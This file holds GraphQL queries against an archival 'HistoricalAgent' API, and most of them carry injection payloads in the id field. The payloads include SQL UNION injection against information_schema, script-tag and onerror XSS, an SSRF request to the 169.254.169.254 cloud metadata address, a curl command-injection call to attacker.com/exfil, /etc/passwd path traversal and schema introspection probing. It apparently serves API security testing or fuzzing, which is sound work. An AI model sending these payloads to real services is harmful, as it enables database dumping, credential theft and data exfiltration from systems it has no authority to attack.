query HistoricalAgent {
  HistoricalAgent(id: "AG12345") {
    id
    type
    identifier
    descriptions {
      name
    }
  }
}

query HistoricalAgent {
  HistoricalAgent(id: "AG12345' UNION SELECT NULL,table_name FROM information_schema.tables--") {
    id
    type
    descriptions {
      biographicalHistory
    }
  }
}

query HistoricalAgent {
  HistoricalAgent(id: "1\"><script>alert('XSS')</script>") {
    identifier
    descriptions {
      name
      sources
    }
  }
}

query HistoricalAgent {
  HistoricalAgent(id: "http://169.254.169.254/latest/meta-data") {
    links {
      targets {
        ... on HistoricalAgent {
          id
        }
      }
    }
  }
}

query HistoricalAgent {
  HistoricalAgent(id: "; curl https://attacker.com/exfil") {
    systemEvents {
      logMessage
    }
  }
}

query HistoricalAgent {
  HistoricalAgent(id: "../../../../etc/passwd") {
    descriptions {
      accessPoints {
        name
      }
    }
  }
}

query HistoricalAgent {
  HistoricalAgent(id: "<img src=x onerror=alert(1)>") {
    descriptions {
      legalStatus
      structure
    }
  }
}

query HistoricalAgent {
  HistoricalAgent(id: "AG12345") {
    id
    type
    identifier
    descriptions {
      biographicalHistory
      sources
      functions
    }
    systemEvents {
      timestamp
      eventType
    }
    connected {
      item {
        ... on HistoricalAgent {
          id
        }
      }
    }
  }
}

query HistoricalAgent {
  s: HistoricalAgent(id: "AG12345") {
    id
    type
  }
  t: HistoricalAgent(id: "AG12345") {
    identifier
    descriptions {
      name
    }
  }
}

query Introspection {
  HistoricalAgent {
    queryType {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

